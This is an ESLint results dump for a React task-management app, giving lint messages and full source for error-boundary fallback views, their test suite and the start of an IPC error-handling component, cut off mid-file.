&& !this.state.hasError && (\n                <motion.div\n                  initial={{ opacity: 0, y: 20 }}\n                  animate={{ opacity: 1, y: 0 }}\n                  exit={{ opacity: 0, y: 20 }}\n                  className=\"p-4 bg-green-50 dark:bg-green-900/20 border-t border-green-200 dark:border-green-800\"\n                >\n                  <div className=\"flex items-center gap-2 text-green-800 dark:text-green-200\">\n                    <CheckCircle className=\"w-5 h-5\" />\n                    <span className=\"font-medium\">Recovery Complete!</span>\n                  </div>\n                  <p className=\"text-sm text-green-700 dark:text-green-300 mt-1\">\n                    Your application has been successfully recovered and is ready to use.\n                  </p>\n                </motion.div>\n              )}\n            </AnimatePresence>\n\n            {/* Development Info */}\n            {this.props.showDeveloperInfo && process.env.NODE_ENV === 'development' && this.state.errorInfo && (\n              <details className=\"p-4 bg-muted/50 border-t\">\n                <summary className=\"cursor-pointer font-medium text-sm\">\n                  Developer Information\n                </summary>\n                <pre className=\"text-xs mt-2 overflow-auto max-h-40 text-muted-foreground\">\n                  {this.state.errorInfo.componentStack}\n                </pre>\n              </details>\n            )}\n          </motion.div>\n        </div>\n      );\n    }\n\n    return this.props.children;\n  }\n}\n\nexport default StoreErrorBoundary;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/ViewErrorFallbacks.tsx","messages":[{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":353,"column":17,"nodeType":"Identifier","messageId":"namedExport","endLine":353,"endColumn":37}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React from 'react';\nimport { motion } from 'framer-motion';\nimport { \n  AlertTriangle, \n  RefreshCw, \n  List, \n  Calendar, \n  BarChart3, \n  Kanban,\n  Clock,\n  Home,\n  Bug,\n  FileX\n} from 'lucide-react';\n\ninterface ViewErrorFallbackProps {\n  onRetry?: () => void;\n  onGoHome?: () => void;\n  onReload?: () => void;\n  error?: Error;\n  errorId?: string;\n  retryCount?: number;\n  maxRetries?: number;\n}\n\n// Base fallback component with shared functionality\nconst BaseViewErrorFallback: React.FC<ViewErrorFallbackProps & {\n  title: string;\n  description: string;\n  icon: React.ReactNode;\n  suggestions: string[];\n  primaryAction?: { label: string; action: () => void; variant?: 'primary' | 'secondary' };\n}> = ({ \n  title, \n  description, \n  icon, \n  suggestions, \n  primaryAction,\n  onRetry, \n  onGoHome, \n  onReload,\n  error,\n  errorId,\n  retryCount = 0,\n  maxRetries = 3\n}) => {\n  const canRetry = retryCount < maxRetries;\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, scale: 0.95 }}\n      animate={{ opacity: 1, scale: 1 }}\n      transition={{ duration: 0.3 }}\n      className=\"flex flex-col items-center justify-center h-full p-8 text-center bg-card/50 rounded-lg border border-border/50 backdrop-blur-sm\"\n    >\n      {/* Error Icon */}\n      <motion.div\n        initial={{ y: -20 }}\n        animate={{ y: 0 }}\n        transition={{ delay: 0.1 }}\n        className=\"mb-6\"\n      >\n        <div className=\"relative\">\n          <motion.div\n            animate={{ rotate: [0, -5, 5, 0] }}\n            transition={{ duration: 2, repeat: Infinity, repeatDelay: 3 }}\n            className=\"w-16 h-16 mx-auto text-destructive/80 mb-4\"\n          >\n            {icon}\n          </motion.div>\n          \n          <motion.div\n            initial={{ scale: 0 }}\n            animate={{ scale: 1 }}\n            transition={{ delay: 0.3, type: \"spring\" }}\n            className=\"absolute -top-2 -right-2 w-6 h-6 bg-destructive/20 rounded-full flex items-center justify-center\"\n          >\n            <AlertTriangle size={16} className=\"text-destructive\" />\n          </motion.div>\n        </div>\n      </motion.div>\n\n      {/* Error Content */}\n      <motion.div\n        initial={{ y: 20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ delay: 0.2 }}\n        className=\"space-y-4 max-w-md\"\n      >\n        <h3 className=\"text-xl font-semibold text-foreground\">\n          {title}\n        </h3>\n        \n        <p className=\"text-muted-foreground\">\n          {description}\n        </p>\n\n        {/* Suggestions */}\n        {suggestions.length > 0 && (\n          <div className=\"text-left bg-muted/30 rounded-lg p-4 mt-4\">\n            <h4 className=\"font-medium text-sm mb-2 text-foreground\">\n              Try these solutions:\n            </h4>\n            <ul className=\"text-xs text-muted-foreground space-y-1\">\n              {suggestions.map((suggestion, index) => (\n                <li key={index} className=\"flex items-start gap-2\">\n                  <span className=\"text-primary\">â€¢</span>\n                  <span>{suggestion}</span>\n                </li>\n              ))}\n            </ul>\n          </div>\n        )}\n\n        {/* Error details in development */}\n        {process.env.NODE_ENV === 'development' && error && (\n          <motion.details\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            transition={{ delay: 0.4 }}\n            className=\"text-left bg-muted/50 rounded-lg p-4 mt-4\"\n          >\n            <summary className=\"cursor-pointer font-medium text-sm mb-2 flex items-center gap-2\">\n              <Bug size={16} />\n              Error Details (Development)\n            </summary>\n            <pre className=\"text-xs text-destructive overflow-auto max-h-32 whitespace-pre-wrap\">\n              {error.name}: {error.message}\n              {errorId && `\\nError ID: ${errorId}`}\n              {error.stack && `\\n\\n${error.stack}`}\n            </pre>\n          </motion.details>\n        )}\n\n        {/* Retry info */}\n        {retryCount > 0 && (\n          <motion.p\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            className=\"text-sm text-muted-foreground\"\n          >\n            Retry attempt: {retryCount}/{maxRetries}\n          </motion.p>\n        )}\n      </motion.div>\n\n      {/* Action Buttons */}\n      <motion.div\n        initial={{ y: 20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ delay: 0.3 }}\n        className=\"flex flex-wrap gap-3 mt-8\"\n      >\n        {primaryAction && (\n          <motion.button\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={primaryAction.action}\n            className={`inline-flex items-center gap-2 px-4 py-2 rounded-lg transition-colors ${\n              primaryAction.variant === 'secondary'\n                ? 'bg-secondary text-secondary-foreground hover:bg-secondary/90'\n                : 'bg-primary text-primary-foreground hover:bg-primary/90'\n            }`}\n          >\n            {primaryAction.label}\n          </motion.button>\n        )}\n\n        {canRetry && onRetry && (\n          <motion.button\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={onRetry}\n            className=\"inline-flex items-center gap-2 px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors\"\n          >\n            <RefreshCw size={16} />\n            Try Again\n          </motion.button>\n        )}\n\n        <motion.button\n          whileHover={{ scale: 1.05 }}\n          whileTap={{ scale: 0.95 }}\n          onClick={onReload}\n          className=\"inline-flex items-center gap-2 px-4 py-2 bg-secondary text-secondary-foreground rounded-lg hover:bg-secondary/90 transition-colors\"\n        >\n          <RefreshCw size={16} />\n          Reload View\n        </motion.button>\n\n        <motion.button\n          whileHover={{ scale: 1.05 }}\n          whileTap={{ scale: 0.95 }}\n          onClick={onGoHome}\n          className=\"inline-flex items-center gap-2 px-4 py-2 bg-muted text-muted-foreground rounded-lg hover:bg-muted/90 transition-colors\"\n        >\n          <Home size={16} />\n          Go Home\n        </motion.button>\n      </motion.div>\n    </motion.div>\n  );\n};\n\n// TaskListView Error Fallback\nexport const TaskListErrorFallback: React.FC<ViewErrorFallbackProps> = (props) => (\n  <BaseViewErrorFallback\n    {...props}\n    title=\"Task List View Error\"\n    description=\"The task list couldn't be displayed due to an unexpected error. Your tasks are safe and will reappear when the issue is resolved.\"\n    icon={<List size={64} />}\n    suggestions={[\n      \"Check if you have any tasks that might contain invalid data\",\n      \"Try switching to a different view (Kanban, Calendar) and back\",\n      \"Refresh the page to reload all task data\",\n      \"Check your internet connection if syncing with remote data\"\n    ]}\n    primaryAction={{\n      label: \"Switch to Kanban View\",\n      action: () => {\n        // This would be passed down from parent to switch views\n        window.location.hash = '#kanban';\n      },\n      variant: 'secondary'\n    }}\n  />\n);\n\n// KanbanView Error Fallback\nexport const KanbanErrorFallback: React.FC<ViewErrorFallbackProps> = (props) => (\n  <BaseViewErrorFallback\n    {...props}\n    title=\"Kanban Board Error\"\n    description=\"The kanban board couldn't render properly. This might be due to issues with task categorization or drag-and-drop functionality.\"\n    icon={<Kanban size={64} />}\n    suggestions={[\n      \"Verify that all tasks have valid status values\",\n      \"Try switching to List View to see your tasks\",\n      \"Check if any tasks have circular dependencies\",\n      \"Disable any browser extensions that might interfere with drag-and-drop\"\n    ]}\n    primaryAction={{\n      label: \"Switch to List View\",\n      action: () => {\n        window.location.hash = '#list';\n      },\n      variant: 'secondary'\n    }}\n  />\n);\n\n// AnalyticsView Error Fallback\nexport const AnalyticsErrorFallback: React.FC<ViewErrorFallbackProps> = (props) => (\n  <BaseViewErrorFallback\n    {...props}\n    title=\"Analytics View Error\"\n    description=\"Unable to generate analytics and charts. This could be due to data processing issues or chart rendering problems.\"\n    icon={<BarChart3 size={64} />}\n    suggestions={[\n      \"Ensure you have sufficient task data for meaningful analytics\",\n      \"Check if any task dates are in invalid formats\",\n      \"Try clearing your browser cache and reloading\",\n      \"Switch to another view while we resolve the analytics issue\"\n    ]}\n    primaryAction={{\n      label: \"View Tasks Instead\",\n      action: () => {\n        window.location.hash = '#list';\n      },\n      variant: 'secondary'\n    }}\n  />\n);\n\n// CalendarView Error Fallback\nexport const CalendarErrorFallback: React.FC<ViewErrorFallbackProps> = (props) => (\n  <BaseViewErrorFallback\n    {...props}\n    title=\"Calendar View Error\"\n    description=\"The calendar couldn't display your tasks. This might be related to date processing or calendar rendering issues.\"\n    icon={<Calendar size={64} />}\n    suggestions={[\n      \"Check if your tasks have valid due dates\",\n      \"Verify that task dates are in the correct format\",\n      \"Try viewing tasks without dates in the List view\",\n      \"Check your system's date and time settings\"\n    ]}\n    primaryAction={{\n      label: \"Switch to Timeline\",\n      action: () => {\n        window.location.hash = '#timeline';\n      },\n      variant: 'secondary'\n    }}\n  />\n);\n\n// TimelineView Error Fallback\nexport const TimelineErrorFallback: React.FC<ViewErrorFallbackProps> = (props) => (\n  <BaseViewErrorFallback\n    {...props}\n    title=\"Timeline View Error\"\n    description=\"The timeline couldn't be rendered. This could be due to issues with task sequencing or timeline calculations.\"\n    icon={<Clock size={64} />}\n    suggestions={[\n      \"Verify that tasks have valid start and end dates\",\n      \"Check for any circular task dependencies\",\n      \"Try viewing individual tasks in List view\",\n      \"Ensure task durations are reasonable\"\n    ]}\n    primaryAction={{\n      label: \"Switch to Calendar\",\n      action: () => {\n        window.location.hash = '#calendar';\n      },\n      variant: 'secondary'\n    }}\n  />\n);\n\n// Generic fallback for unknown views\nexport const GenericViewErrorFallback: React.FC<ViewErrorFallbackProps & { viewType?: string }> = ({ \n  viewType, \n  ...props \n}) => (\n  <BaseViewErrorFallback\n    {...props}\n    title={`${viewType || 'View'} Error`}\n    description=\"This view encountered an unexpected error. Please try refreshing or switching to a different view.\"\n    icon={<FileX size={64} />}\n    suggestions={[\n      \"Try refreshing the page\",\n      \"Switch to a different view\",\n      \"Check the browser console for more details\",\n      \"Report this issue if it continues to occur\"\n    ]}\n    primaryAction={{\n      label: \"Go to List View\",\n      action: () => {\n        window.location.hash = '#list';\n      },\n      variant: 'secondary'\n    }}\n  />\n);\n\n// Export all fallback components\nexport {\n  BaseViewErrorFallback\n};\n\n// Utility function to get the appropriate fallback component\nexport function getViewErrorFallback(viewType: string): React.FC<ViewErrorFallbackProps> {\n  switch (viewType) {\n    case 'list':\n    case 'taskList':\n      return TaskListErrorFallback;\n    case 'kanban':\n      return KanbanErrorFallback;\n    case 'analytics':\n      return AnalyticsErrorFallback;\n    case 'calendar':\n      return CalendarErrorFallback;\n    case 'timeline':\n      return TimelineErrorFallback;\n    default:\n      return (props) => <GenericViewErrorFallback {...props} viewType={viewType} />;\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/__tests__/ErrorBoundary.test.tsx","messages":[{"ruleId":"no-useless-catch","severity":2,"message":"Unnecessary try/catch wrapper.","line":152,"column":11,"nodeType":"TryStatement","messageId":"unnecessaryCatch","endLine":157,"endColumn":12}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Error Boundary Component Tests (2025)\n * \n * Comprehensive test suite for error boundaries, testing error catching,\n * fallback UI rendering, and recovery mechanisms.\n * \n * Following 2025 React Testing Library and error boundary best practices.\n */\n\nimport { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\nimport { render, screen, fireEvent, waitFor } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { ErrorBoundary } from '../ErrorBoundary';\nimport { testUtils } from '@tests/setup';\n\n// Mock error reporting service\nconst mockErrorReporting = {\n  captureError: vi.fn(),\n  addBreadcrumb: vi.fn(),\n  setContext: vi.fn(),\n};\n\nvi.mock('@/services/ErrorReportingService', () => ({\n  ErrorReportingService: {\n    getInstance: () => mockErrorReporting,\n  },\n}));\n\n// Mock console.error to prevent noise in test output\nconst _originalConsoleError = console.error;\nbeforeEach(() => {\n  console.error = vi.fn();\n  vi.clearAllMocks();\n});\n\nafterEach(() => {\n  console.error = _originalConsoleError;\n});\n\ndescribe('ErrorBoundary', () => {\n  let user: ReturnType<typeof userEvent.setup>;\n\n  beforeEach(() => {\n    user = userEvent.setup();\n  });\n\n  describe('Normal Operation', () => {\n    it('should render children when no error occurs', () => {\n      const TestComponent = () => <div>Normal content</div>;\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <TestComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText('Normal content')).toBeInTheDocument();\n    });\n\n    it('should not interfere with child component props', () => {\n      const TestComponent = ({ message }: { message: string }) => (\n        <div>{message}</div>\n      );\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <TestComponent message=\"Test message\" />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText('Test message')).toBeInTheDocument();\n    });\n  });\n\n  describe('Error Catching', () => {\n    it('should catch and display error in child component', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent(\n        'Test error message'\n      );\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/something went wrong/i)).toBeInTheDocument();\n      expect(screen.getByText(/test error message/i)).toBeInTheDocument();\n    });\n\n    it('should display different UI based on error level', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      // Component level error\n      const { unmount } = render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/component error/i)).toBeInTheDocument();\n      \n      unmount();\n\n      // Route level error\n      render(\n        <ErrorBoundary level=\"route\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/page error/i)).toBeInTheDocument();\n    });\n\n    it('should catch errors in nested components', () => {\n      const DeepErrorComponent = () => {\n        throw new Error('Deep nested error');\n      };\n\n      const NestedComponent = () => (\n        <div>\n          <span>Nested content</span>\n          <DeepErrorComponent />\n        </div>\n      );\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <NestedComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/deep nested error/i)).toBeInTheDocument();\n    });\n\n    it('should catch async errors when reported manually', async () => {\n      const AsyncErrorComponent = () => {\n        const handleAsyncError = async () => {\n          try {\n            await Promise.reject(new Error('Async error'));\n          } catch (error) {\n            // Manually report async error to boundary\n            throw error;\n          }\n        };\n\n        return (\n          <button onClick={handleAsyncError}>\n            Trigger async error\n          </button>\n        );\n      };\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <AsyncErrorComponent />\n        </ErrorBoundary>\n      );\n\n      const button = screen.getByText('Trigger async error');\n      fireEvent.click(button);\n\n      await waitFor(() => {\n        expect(screen.getByText(/async error/i)).toBeInTheDocument();\n      });\n    });\n  });\n\n  describe('Error Reporting', () => {\n    it('should report errors to error reporting service', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent(\n        'Reported error'\n      );\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(mockErrorReporting.captureError).toHaveBeenCalledWith(\n        expect.objectContaining({\n          message: 'Reported error'\n        }),\n        expect.objectContaining({\n          level: 'component',\n          boundary: 'ErrorBoundary'\n        })\n      );\n    });\n\n    it('should add breadcrumbs for error context', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\" viewType=\"TestComponent\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(mockErrorReporting.addBreadcrumb).toHaveBeenCalledWith({\n        message: 'Error boundary caught error',\n        category: 'error',\n        level: 'error',\n        data: {\n          componentName: 'TestComponent',\n          errorBoundaryLevel: 'component'\n        }\n      });\n    });\n\n    it('should set error context for better debugging', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"route\" viewType=\"PageComponent\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(mockErrorReporting.setContext).toHaveBeenCalledWith('errorBoundary', {\n        level: 'page',\n        componentName: 'PageComponent',\n        timestamp: expect.any(String)\n      });\n    });\n  });\n\n  describe('Recovery Mechanisms', () => {\n    it('should show retry button in fallback UI', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/try again/i)).toBeInTheDocument();\n    });\n\n    it('should attempt recovery when retry button is clicked', async () => {\n      let shouldThrow = true;\n      const ConditionalErrorComponent = () => {\n        if (shouldThrow) {\n          throw new Error('Conditional error');\n        }\n        return <div>Recovery successful</div>;\n      };\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ConditionalErrorComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/conditional error/i)).toBeInTheDocument();\n\n      // Fix the error condition\n      shouldThrow = false;\n\n      // Click retry button\n      const retryButton = screen.getByText(/try again/i);\n      await user.click(retryButton);\n\n      expect(screen.getByText('Recovery successful')).toBeInTheDocument();\n    });\n\n    it('should reset error state on successful recovery', async () => {\n      let errorCount = 0;\n      const RecoveryTestComponent = () => {\n        errorCount++;\n        if (errorCount === 1) {\n          throw new Error('First error');\n        }\n        return <div>Component recovered</div>;\n      };\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <RecoveryTestComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/first error/i)).toBeInTheDocument();\n\n      const retryButton = screen.getByText(/try again/i);\n      await user.click(retryButton);\n\n      expect(screen.getByText('Component recovered')).toBeInTheDocument();\n      expect(screen.queryByText(/first error/i)).not.toBeInTheDocument();\n    });\n\n    it('should provide fallback navigation for page-level errors', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"route\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/go to dashboard/i)).toBeInTheDocument();\n      expect(screen.getByText(/reload application/i)).toBeInTheDocument();\n    });\n  });\n\n  describe('Development Features', () => {\n    it('should show detailed error information in development', () => {\n      // Mock development environment\n      const originalEnv = process.env.NODE_ENV;\n      process.env.NODE_ENV = 'development';\n\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent(\n        'Development error'\n      );\n\n      render(\n        <ErrorBoundary level=\"component\" enableStatePreservation={true}>\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/error details/i)).toBeInTheDocument();\n      expect(screen.getByText(/development error/i)).toBeInTheDocument();\n\n      // Restore environment\n      process.env.NODE_ENV = originalEnv;\n    });\n\n    it('should hide stack traces in production', () => {\n      // Mock production environment\n      const originalEnv = process.env.NODE_ENV;\n      process.env.NODE_ENV = 'production';\n\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.queryByText(/stack trace/i)).not.toBeInTheDocument();\n\n      // Restore environment\n      process.env.NODE_ENV = originalEnv;\n    });\n\n    it('should provide error boundary information for debugging', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\" viewType=\"DebugComponent\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/debugcomponent/i)).toBeInTheDocument();\n      expect(screen.getByText(/component level/i)).toBeInTheDocument();\n    });\n  });\n\n  describe('Accessibility', () => {\n    it('should have proper ARIA labels for error UI', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      const errorAlert = screen.getByRole('alert');\n      expect(errorAlert).toBeInTheDocument();\n      expect(errorAlert).toHaveAttribute('aria-live', 'assertive');\n    });\n\n    it('should be keyboard navigable', async () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      const retryButton = screen.getByText(/try again/i);\n      \n      // Should be focusable\n      retryButton.focus();\n      expect(retryButton).toHaveFocus();\n\n      // Should activate with Enter key\n      await user.keyboard('{Enter}');\n      // Test would verify retry functionality here\n    });\n\n    it('should announce errors to screen readers', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent(\n        'Screen reader error'\n      );\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      const announcement = screen.getByText(/an error occurred/i);\n      expect(announcement).toHaveAttribute('aria-live', 'assertive');\n    });\n  });\n\n  describe('Performance', () => {\n    it('should not impact performance when no errors occur', () => {\n      const renderSpy = vi.fn();\n      \n      const TestComponent = () => {\n        renderSpy();\n        return <div>No error content</div>;\n      };\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <TestComponent />\n        </ErrorBoundary>\n      );\n\n      expect(renderSpy).toHaveBeenCalledTimes(1);\n    });\n\n    it('should handle multiple errors efficiently', () => {\n      const MultiErrorComponent = () => {\n        throw new Error('Multiple error test');\n      };\n\n      // First error boundary\n      render(\n        <ErrorBoundary level=\"component\">\n          <MultiErrorComponent />\n        </ErrorBoundary>\n      );\n\n      // Second error boundary  \n      render(\n        <ErrorBoundary level=\"component\">\n          <MultiErrorComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getAllByText(/multiple error test/i)).toHaveLength(2);\n      expect(mockErrorReporting.captureError).toHaveBeenCalledTimes(2);\n    });\n  });\n\n  describe('Integration with Error Store', () => {\n    it('should integrate with global error store', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\" reportToStore={true}>\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      // Would verify error was added to global error store\n      // This would require mocking the error store\n    });\n\n    it('should provide error recovery suggestions', () => {\n      const ErrorThrowingComponent = testUtils.createErrorThrowingComponent();\n\n      render(\n        <ErrorBoundary level=\"component\">\n          <ErrorThrowingComponent />\n        </ErrorBoundary>\n      );\n\n      expect(screen.getByText(/reload the page/i)).toBeInTheDocument();\n      expect(screen.getByText(/contact support/i)).toBeInTheDocument();\n    });\n  });\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/withIPCErrorHandling.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'IPCErrorCode' is defined but never used.","line":14,"column":10,"nodeType":null,"messageId":"unusedVar","endLine":14,"endColumn":22},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'IPCResponse' is defined but never used.","line":14,"column":29,"nodeType":null,"messageId":"unusedVar","endLine":14,"endColumn":40},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":23,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":23,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[859,862],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[859,862],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Move your component(s) to a separate file.","line":45,"column":10,"nodeType":"Identifier","messageId":"localComponents","endLine":45,"endColumn":23},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRequireIPC\" is called conditionally. React Hooks must be called in the exact same order in every component render.","line":237,"column":31,"nodeType":"Identifier","endLine":237,"endColumn":44},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useIPC\" is called conditionally. React Hooks must be called in the exact same order in every component render.","line":237,"column":49,"nodeType":"Identifier","endLine":237,"endColumn":55},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has unnecessary dependencies: 'gracefulDegradation' and 'requiresIPC'. Either exclude them or remove the dependency array. Outer scope values like 'requiresIPC' aren't valid dependencies because mutating them doesn't re-render the component.","line":251,"column":8,"nodeType":"ArrayExpression","endLine":251,"endColumn":73,"suggestions":[{"desc":"Update the dependencies array to be: [ipc.isAvailable, showFallback]","fix":{"range":[8031,8096],"text":"[ipc.isAvailable, showFallback]"}}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has an unnecessary dependency: 'requiresIPC'. Either exclude it or remove the dependency array. Outer scope values like 'requiresIPC' aren't valid dependencies because mutating them doesn't re-render the component.","line":258,"column":8,"nodeType":"ArrayExpression","endLine":258,"endColumn":53,"suggestions":[{"desc":"Update the dependencies array to be: [ipc.isHealthy, ipc.isAvailable]","fix":{"range":[8259,8304],"text":"[ipc.isHealthy, ipc.isAvailable]"}}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has an unnecessary dependency: 'requiresIPC'. Either exclude it or remove the dependency array. Outer scope values like 'requiresIPC' aren't valid dependencies because mutating them doesn't re-render the component.","line":268,"column":8,"nodeType":"ArrayExpression","endLine":268,"endColumn":36,"suggestions":[{"desc":"Update the dependencies array to be: [ipc.lastError]","fix":{"range":[8500,8528],"text":"[ipc.lastError]"}}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":283,"column":16,"nodeType":null,"messageId":"unusedVar","endLine":283,"endColumn":21},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRequireIPC\" is called conditionally. React Hooks must be called in the exact same order in every component render.","line":375,"column":29,"nodeType":"Identifier","endLine":375,"endColumn":42},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useIPC\" is called conditionally. React Hooks must be called in the exact same order in every component render.","line":375,"column":47,"nodeType":"Identifier","endLine":375,"endColumn":53},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has missing dependencies: 'onConnectionLost' and 'onConnectionRestored'. Either include them or remove the dependency array.","line":388,"column":6,"nodeType":"ArrayExpression","endLine":388,"endColumn":46,"suggestions":[{"desc":"Update the dependencies array to be: [ipc.isAvailable, requiresIPC, hasError, onConnectionLost, onConnectionRestored]","fix":{"range":[11991,12031],"text":"[ipc.isAvailable, requiresIPC, hasError, onConnectionLost, onConnectionRestored]"}}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'onIPCError'. Either include it or remove the dependency array.","line":398,"column":6,"nodeType":"ArrayExpression","endLine":398,"endColumn":55,"suggestions":[{"desc":"Update the dependencies array to be: [ipc.lastError, requiresIPC, gracefulDegradation, onIPCError]","fix":{"range":[12230,12279],"text":"[ipc.lastError, requiresIPC, gracefulDegradation, onIPCError]"}}]}],"suppressedMessages":[],"errorCount":4,"fatalErrorCount":0,"warningCount":10,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Higher-Order Component for IPC Error Handling (2025)\n * \n * This HOC wraps components that require IPC communication with standardized\n * error handling, fallback UI, and recovery mechanisms.\n * \n * Following 2025 React patterns for HOCs and error boundaries.\n */\n\nimport { ComponentType, ReactNode, useEffect, useState } from 'react';\nimport { motion } from 'framer-motion';\nimport { AlertTriangle, RefreshCw, WifiOff, Settings, Info } from 'lucide-react';\nimport { useIPC, useRequireIPC, useSafeIPC } from '@/contexts/IPCContext';\nimport { IPCErrorCode, type IPCResponse } from '@/lib/ipc';\n\n// Props interface for the HOC\ninterface WithIPCErrorHandlingProps {\n  fallbackComponent?: ReactNode;\n  requiresIPC?: boolean;\n  gracefulDegradation?: boolean;\n  retryable?: boolean;\n  showConnectionStatus?: boolean;\n  onIPCError?: (error: string, context?: any) => void;\n  onConnectionLost?: () => void;\n  onConnectionRestored?: () => void;\n}\n\n// Fallback UI props\ninterface IPCFallbackUIProps {\n  error?: string;\n  isAvailable: boolean;\n 